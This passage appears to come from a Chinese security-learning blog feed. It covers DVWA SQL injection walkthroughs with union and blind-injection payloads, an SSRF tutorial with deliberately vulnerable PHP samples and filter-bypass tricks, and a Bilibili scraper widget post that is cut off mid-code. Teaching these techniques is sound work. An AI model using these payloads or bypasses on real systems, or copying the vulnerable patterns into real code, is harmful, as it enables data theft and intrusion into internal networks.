class="php"></span></span><br><span class="line"><span class="php">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>high等级的查询是通过在弹出页面输入id然后提交进行查询，将数据展示在原页面上，<br>而且id的值储存在了SESSION中，程序也没有对id进行任何的安全处理，这样产生了sql注入问题<br>high等级的这种做法能够避免sqlmap进行爆破，但是如果不对数据进行安全处理，还是会引发安全问题</p><p>high等级的注入payload和low等级的基本相同</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">' order by <span class="number">1</span><span class="meta">#正常</span></span><br><span class="line">' order by <span class="number">2</span><span class="meta">#正常</span></span><br><span class="line">' order by <span class="number">3</span><span class="meta">#返回错误字段数为2</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,database()<span class="meta">#查数据库名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,table_name from information_schema.tables <span class="built_in">where</span> table_schema=database()<span class="meta">#查表名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,column_name from information_schema.columns <span class="built_in">where</span> table_name='users'<span class="meta">#查列名</span></span><br><span class="line">' <span class="built_in">union</span> <span class="built_in">select</span> user,password from dvwa.users<span class="meta">#查字段</span></span><br></pre></td></tr></table></figure><hr><h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><ul><li>对于基于布尔的盲注，可通过构造真or假判断条件(数据库各项信息取值的大小比较，如:字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…)，将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果(True、False)；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</li><li>对于基于时间的盲注，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假(若执行sleep延迟，则表示当前设置的判断条件为真)；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</li><li>报错型注入则是利用了MySQL的第8652号bug :Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果。</li></ul><p><strong>以下使用的方法均为基于布尔的盲注</strong><br>基于时间的盲注参考<a href="http://www.storysec.com/dvwa-sql-injection-blind.html" target="_blank" rel="noopener">传送门</a></p><h2 id="Low-Level-1"><a href="#Low-Level-1" class="headerlink" title="Low Level"></a>Low Level</h2><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1’</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">0</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1 and 1=1#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1’ and 1=1#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1 and 1=2#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1’ and 1=2#</td><td align="center">User ID is MISSING from the database.</td></tr></tbody></table><p>说明存在<strong>字符型</strong>的sql<strong>盲注</strong></p><h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><ol><li>猜解数据库名的长度</li></ol><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">1’ and length(database())&lt;10#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1’ and length(database())&lt;5#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">1’ and length(database())&lt;3#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and length(database())=4#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">说明数据库名长度为4</td><td align="center"></td></tr></tbody></table><ol start="2"><li>猜解数据库名<br>利用substr()函数和ascii()函数进行猜解数据库名<br><code>substr(string, start, length)</code></li></ol><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">1’ and ascii(substr(database(),1,1))&gt;97#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and ascii(substr(database(),1,1))&lt;122#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and ascii(substr(database(),1,1))&lt;109#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and ascii(substr(database(),1,1))&lt;103#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and ascii(substr(database(),1,1))&lt;100#</td><td align="center">User ID is MISSING from the database.</td></tr><tr><td align="center">1’ and ascii(substr(database(),1,1))=100#</td><td align="center">User ID exists in the database.</td></tr><tr><td align="center">猜解出数据库名的第一个字符为ascii码为100的字符 d</td><td align="center"></td></tr><tr><td align="center">循环上述操作，最终猜解出数据库名dvwa</td><td align="center"></td></tr></tbody></table><h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><ol><li>猜解表的数量<br>最终返回exist的payload <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2#</code><br>猜解出有两个表</li><li>猜解表名长度<br>猜解出第一个表名的长度payload <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1),1))=9#</code><br>猜解出第二个表名的长度payload <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),1))=5#</code></li><li>猜解表名<br>猜解第一个表名<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</code><br>……<br>循环猜解得到第一个表名为guestbook<br>猜解第二个表名<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;97#</code><br>……<br>循环猜解得到第二个表名为users</li></ol><h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><ol><li>猜解列数量<br>payload <code>1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=11#</code></li><li>猜解列长度<br>payload <code>1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=7#</code><br>……<br>循环猜解出每个列名的长度</li><li>猜解列名<br>payload <code>1&#39; and ascii(strsub((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),1,1))&gt;1#</code><br>得到列名 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3>payload <code>1&#39; and ascii(substr((select user from dvwa.users where user_id=1),1,1))&gt;1#</code><br>循环查询user和password的值</li></ol><h2 id="Medium-Level-1"><a href="#Medium-Level-1" class="headerlink" title="Medium Level"></a>Medium Level</h2><p>总体思路和Low没什么区别<br>思路:bp抓包提交payload，循环爆破数据库名，表名，列名，字段值<br>注意点:<strong>数字型</strong>的<strong>盲注</strong>，需要16进制绕过对引号的转义</p><h2 id="High-Level"><a href="#High-Level" class="headerlink" title="High Level"></a>High Level</h2><p>思路和Low也没什么区别<br>思路:构造payload，循环爆破数据库名，表名，列名，字段值<br>注意点:<strong>字符型</strong>的<strong>盲注</strong>，可能需要用#注释掉 LIMIT 语句的限制，程序中添加了随机的sleep()函数，会使得基于时间的盲注受到干扰</p><blockquote><p><strong>相关链接:</strong><br><a href="https://www.abelche.com/2018/07/02/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" target="_blank" rel="noopener">关于SQL基本增删改查</a><br><a href="https://www.abelche.com/2018/07/25/%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">关于SQL注入的常见方式</a><br><a href="https://www.abelche.com/2018/08/07/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/" target="_blank" rel="noopener">SQL手注</a><br><a href="http://www.storysec.com/dvwa-sql-injection-blind.html" target="_blank" rel="noopener">dvwa基于时间的盲注</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL-Injection&quot;&gt;&lt;a href=&quot;#SQL-Injection&quot; class=&quot;headerlink&quot; title=&quot;SQL Injection&quot;&gt;&lt;/a&gt;SQL Injection&lt;/h1&gt;&lt;h2 id=&quot;Low-Level&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="Learning" scheme="http://AbelChe.com/categories/Learning/"/>
    
    
      <category term="SQL注入" scheme="http://AbelChe.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ssrf漏洞解析</title>
    <link href="http://AbelChe.com/2019/03/17/ssrf%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
    <id>http://AbelChe.com/2019/03/17/ssrf漏洞解析/</id>
    <published>2019-03-17T02:35:44.000Z</published>
    <updated>2019-08-15T11:02:50.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种:</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序(比如溢出)</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(比如 Struts2，sqli 等)</li><li>利用 file 协议读取本地文件等</li></ol><p>上面的话说的有点抽象，然后说一下网上大佬的理解<br><strong>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 : A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</strong><br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。<br>正常用户访问网站的流程是:<br>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求(没有过滤)，并处理 –&gt;返回用户响应<br>【 那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL</a> 】<br>那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性<br>产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据<br>例如:<br><a href="http://www.baidu.com/xxx.php?image=www.abc.com/1.jpg" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=www.abc.com/1.jpg</a><br>如果我们将<a href="http://www.abd.com/1.jpg" target="_blank" rel="noopener">www.abd.com/1.jpg</a> 换为与该服务器相连的内网服务器地址会产生什么效果呢？<br>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码<br>终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p><h1 id="可能出现的场景"><a href="#可能出现的场景" class="headerlink" title="可能出现的场景"></a>可能出现的场景</h1><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源(Upload from URL，Import &amp; Export RSS Feed)</li><li>数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB)</li><li>Webmail 收取其他邮箱邮件(POP3、IMAP、SMTP)</li><li>文件处理、编码处理、属性信息处理(ffmpeg、ImageMagic、DOCX、PDF、XML)</li></ul><h1 id="可进行利用的协议"><a href="#可进行利用的协议" class="headerlink" title="可进行利用的协议"></a>可进行利用的协议</h1><pre><code>FILE                           读取服务器上任意文件内容IMAP/IMAPS/POP3SMTP/SMTPS      爆破邮件用户名密码FTP/FTPS                       FTP匿名访问、爆破DICT                           操作内网Redis等服务GOPHER                         能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞TFTP                           UDP协议扩展</code></pre><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span></span><br><span class="line"><span class="php">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span></span><br><span class="line"><span class="php">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span></span><br><span class="line"><span class="php">    file_put_contents($filename, $content); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span></span><br><span class="line"><span class="php">    $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $img;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><p>打开网络连接或者Unix套接字连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">'url'</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="string">"<span class="variable">$host</span>"</span>, 80, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">"Host: <span class="variable">$host</span>\r\n"</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> fgets(<span class="variable">$fp</span>, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><p>使用 curl 获取到数据<br>使用 file:// 获取到数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $link = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $curlobj = curl_init();</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj,CURLOPT_URL,$link);</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    $result=curl_exec($curlobj);</span></span><br><span class="line"><span class="php">    curl_close($curlobj);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $filename = <span class="string">'./'</span>.rand().<span class="string">'.txt'</span>;</span></span><br><span class="line"><span class="php">    file_put_contents($filename, $result); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $result;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h1><p>利用 file 协议读取文件<br>利用 dict 协议查看端口<br>利用 gopher 协议反弹shell，攻击数据库</p><h1 id="常见的过滤方法"><a href="#常见的过滤方法" class="headerlink" title="常见的过滤方法"></a>常见的过滤方法</h1><ul><li>对 url 开头进行过滤</li><li>对 url 为 ip 格式的连接进行过滤</li><li>对 url 结尾进行判定</li></ul><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><ul><li><p>更改 IP 地址写法 例如192.168.0.1</p><p>8 进制格式:0300.0250.0.1</p><p>16 进制格式:0xC0.0xA8.0.1</p><p>10 进制整数格式:3232235521</p><p>16 进制整数格式:0xC0A80001</p><p>还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1</p><p>利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如:</p></li><li><p><a href="http://www.baidu.com@192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a> 与 <a href="http://192.168.0.1" target="_blank" rel="noopener">http://192.168.0.1</a> 请求的都是 192.168.0.1 的内容</p></li><li><p>可以指向任意 ip 的域名xip.io:<a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a> ==&gt; <a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a></p></li><li><p>短地址<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a> ==&gt; <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></p></li><li><p>利用句号。:127。0。0。1 ==&gt; 127.0.0.1</p></li><li><p>利用 Enclosed alphanumerics</p><pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre></li></ul><hr><p>参考文章:<br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf/</a><br><a href="https://www.jianshu.com/p/6bf7700139fa" target="_blank" rel="noopener">https://www.jianshu.com/p/6bf7700139fa</a><br><a href="https://www.jianshu.com/p/d1d1c40f6d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/d1d1c40f6d4c</a><br><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">https://www.jianshu.com/p/86bb349baac1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF-简介&quot;&gt;&lt;a href=&quot;#SSRF-简介&quot; class=&quot;headerlink&quot; title=&quot;SSRF 简介&quot;&gt;&lt;/a&gt;SSRF 简介&lt;/h1&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者
      
    
    </summary>
    
      <category term="Learning" scheme="http://AbelChe.com/categories/Learning/"/>
    
    
      <category term="Web" scheme="http://AbelChe.com/tags/Web/"/>
    
      <category term="ssrf" scheme="http://AbelChe.com/tags/ssrf/"/>
    
      <category term="服务端请求伪造" scheme="http://AbelChe.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    
  </entry>
  
  <entry>
    <title>基于Rainmeter的B站每日top100桌面推送!!!</title>
    <link href="http://AbelChe.com/2019/03/01/%E5%9F%BA%E4%BA%8ERainmeter%E7%9A%84B%E7%AB%99%E6%AF%8F%E6%97%A5top100%E6%A1%8C%E9%9D%A2%E6%8E%A8%E9%80%81/"/>
    <id>http://AbelChe.com/2019/03/01/基于Rainmeter的B站每日top100桌面推送/</id>
    <published>2019-03-01T03:37:57.000Z</published>
    <updated>2019-08-15T11:02:02.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>最近在使用Rainmeter，将quotes(桌面箴言)改进了一下，他就有了如下功能！</p><blockquote><ul><li>获取B站每日top100视频信息</li><li>将信息随机展示在桌面quote上(随机展示一条信息，标题限制在20字，自动/手动切换)</li><li>双击quote可在浏览器中打开该视频<br>长相如下:<img src="https://8gdtaw.sn.files.1drv.com/y4mTP9F1e7APG2GWA4OiKh1TVORDSbjEo8_ooAMpGYH685lAnbYy0NIYVSppiqVfpjlJEqjczGGPX7BVehEkbuCnk6zAP58qPDiXJEx5BcqpZ6_mx_HBwkaucKg3cMnKc2KC7TO3hSCWalDVLe1k9i-1BCdCJWkE3xMNS8SKrTMd4sdDhF0x3iwDkVwiFsUO1xsfoqNcs4Wrkjy0j2xc84eoA?width=488&height=117&cropmode=none" alt><br>然后，这是我的桌面(有些东西不太好，就隐藏了)<img src="https://8gdqaw.sn.files.1drv.com/y4mTNvE_llBhfDtxHy0rBCwkn4arhOUPCgHIKqdt6V6zNl_qP9M1niQrN8iKr13BP1GpHCyLjXyTXKj_Ust1hMmZ9qfQanPFWiHiEx9OLNu8gdUQWiaVOX_GpvHEtX9NKGJLdpNSjcSbASGbsncU32Gnxb2VgTwavmFU6nY82AM44DNtQL2p5QtwPpKswH0eXIR8ZEBnl_jkAt37taFRwRjGQ?width=1920&height=1080&cropmode=none" alt></li></ul></blockquote><h1 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h1><p>先看下quotes目录下的东西:<img src="https://8gdraw.sn.files.1drv.com/y4ma1cFO61keBtCvpCKrPTR7GOiPOykXDdOy8GuEtBk4eJXxvhG1YJxqYCrdVard4hHt12j5iE2f9mM4THCePyCm3z9kuJ8w7hrjquALQmvg4fV8XQYYAijtc27UAkKpfPhhLSRU3od7Wx7lrIrIBKw3ilyD_JRA-0OzuFIEysuvev6pH1WxDETQGEbl4U-WFlu7v8wFPcXV-xE6vXmD3Ovhg?width=189&height=154&cropmode=none" alt></p><ul><li>getmessage.py 这个是一个简单的python爬虫，爬取bilibili的top100信息(所以电脑上要有python3环境，还要有requests和re模块)，代码如下:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.bilibili.com/ranking'</span><span class="comment"># B站top100网址</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url).content.decode(<span class="string">'utf-8'</span>)<span class="comment"># get请求网址用变量r接收</span></span><br><span class="line">text = re.findall(<span class="string">r'&lt;div class="info"&gt;&lt;a href="//www.bilibili.com/video/.*&lt;/a&gt;&lt;!----&gt;'</span>, r)<span class="comment"># 正则表达式获取到r中所有视频的所有信息用变量text接收</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ListOfQuotes.txt'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:<span class="comment"># 清空文件</span></span><br><span class="line">f.write(<span class="string">''</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):<span class="comment"># 遍历text</span></span><br><span class="line">print(i+<span class="number">1</span>, text[i])</span><br><span class="line">videourl = re.findall(<span class="string">r'//www.bilibili.com/video/.*/"'</span>, text[i])[<span class="number">0</span>][:<span class="number">-1</span>]<span class="comment"># 正则表达式获取到视频的url，用变量videourl接收</span></span><br><span class="line">videourl = <span class="string">'https:'</span> + videourl<span class="comment"># 拼接url，使用https协议</span></span><br><span class="line">print(videourl)</span><br><span class="line"></span><br><span class="line">message = re.findall(<span class="string">r'e"&gt;.*&lt;/a&gt;'</span>, text[i])[<span class="number">0</span>][<span class="number">3</span>:<span class="number">-4</span>]<span class="comment"># 正则表达式获取到视频的title，用变量message接收</span></span><br><span class="line"><span class="keyword">if</span> len(message) &gt; <span class="number">20</span>:<span class="comment"># 控制下title的长度，这里控制在20个字符，如果超过，用......代替</span></span><br><span class="line">message = message[:<span class="number">20</span>] + <span class="string">'......'</span></span><br><span class="line">print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ListOfQuotes.txt'</span>, <span class="string">'a'</span>, encoding=<span class="string">'gb18030'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="comment"># 写入文件，一定要注意编码，因为有些up主会用到特殊符号，gbk编码会出问题！utf-8编码会令quotes读取成乱码！！</span></span><br><span class="line"><span class="comment"># gb18030编码是gbk子集，会将特殊符号显示为??而且quotes显示正常！！</span></span><br><span class="line">f.write(<span class="string">'&lt;quote&gt;['</span> + str(i+<span class="number">1</span>) + <span class="string">']'</span> + message + <span class="string">'\n'</span>)</span><br><span class="line">f.write(<span class="string">'&lt;author&gt;'</span> + videourl + <span 